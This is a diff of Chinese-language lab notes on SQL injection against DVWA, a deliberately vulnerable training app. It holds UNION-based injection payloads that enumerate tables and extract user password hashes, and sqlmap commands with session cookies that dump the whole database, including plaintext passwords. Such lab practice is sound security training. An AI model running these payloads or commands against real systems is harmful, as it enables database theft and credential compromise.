@@ -16,3 +16,16 @@
   5. **爆表**：`1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='dvwa' #` 得到 `users` 表。
   6. **爆字段**：`1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' #` 得到 `user` 和 `password`。
   7. **拿数据**：`1' UNION SELECT user, password FROM users #` 成功获取密码 MD5 哈希！
+
+  ### 练习 4：SQLMap 自动化脱库实战
+- **状态**：成功自动化脱库
+- **工具**：SQLMap (版本 1.6.4)
+- **攻击步骤**：
+  1. 获取当前 Cookie（`PHPSESSID=xxx; security=low`）。
+  2. 基础探测：`sqlmap -u "目标URL" --cookie="Cookie" --batch`
+  3. 获取所有数据库：加上 `--dbs` 参数。
+  4. **一键脱库**：`sqlmap -u "目标URL" --cookie="Cookie" --batch -D dvwa --dump`
+- **成果**：
+  - 识别出漏洞类型：布尔盲注、报错注入、时间盲注、UNION联合查询。
+  - 自动识别出后台数据库：MySQL (MariaDB fork)。
+  - **成功导出所有用户的账号与明文密码！**
